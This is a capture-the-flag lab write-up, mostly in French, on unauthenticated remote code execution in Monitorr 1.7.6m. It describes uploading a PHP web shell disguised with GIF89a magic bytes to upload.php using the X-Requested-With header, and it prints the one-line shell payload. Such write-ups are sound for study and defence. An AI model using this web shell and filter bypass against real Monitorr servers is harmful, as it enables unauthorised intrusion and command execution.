---
doc_kind: writeup
title: "ThunderCipher Trust Me Not - Monitorr 1.7.6m RCE non authentifiee via upload.php"
category: web
slug: trustmenot-monitorr-magicbytes-rce
created: 2026-10-29
status: solved
tags:
  - monitorr
  - magic-bytes-bypass
  - unauth-upload-rce
  - world-readable-flag
source: thundercipher.in/labs
target: "Monitorr 1.7.6m"
---
# ThunderCipher Trust Me Not - Monitorr 1.7.6m RCE non authentifiee via upload.php

## Challenge Summary

- Source: thundercipher.in/labs
- Target: Monitorr 1.7.6m
- Goal: Monitorr 1.7.6m contient une RCE connue non authentifiee dans upload.php: un fichier PHP prefixe des magic bytes GIF89a passe le filtre et est stocke executable.

## Initial Signals

- Entry point: see Exploit Chain step 1
- Visible hints: n/a (see source writeup)
- First confirming probe: see Exploit Chain

## Exploit Chain

1. Identification version via commentaire HTML -> Monitorr 1.7.6m, RCE connue.
2. Fichier GIF89a + PHP system($_GET['cmd']) -> POST multipart vers upload.php avec header X-Requested-With.
3. Fichier stocke et execution confirmee (id).
4. Flags world-readable -> cat direct sans privesc.

## Key Evidence

- Reponse confirmant l'upload puis uid=33(www-data) sur ?cmd=id.

## Dead Ends

- n/a (see Reusable Lessons)

## Payloads And Commands

```text
Fichier GIF89a\n<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?> uploade en multipart avec header X-Requested-With.
```

## Flag / Outcome

- Flag obtenu, chaine confirmee de bout en bout.

## Reusable Lessons

- Monitorr upload.php necessite le header X-Requested-With pour accepter l'upload; magic bytes GIF89a en prefixe suffit a bypasser le filtre image.

## Pattern Candidates

- Voir pattern associe de meme slug.
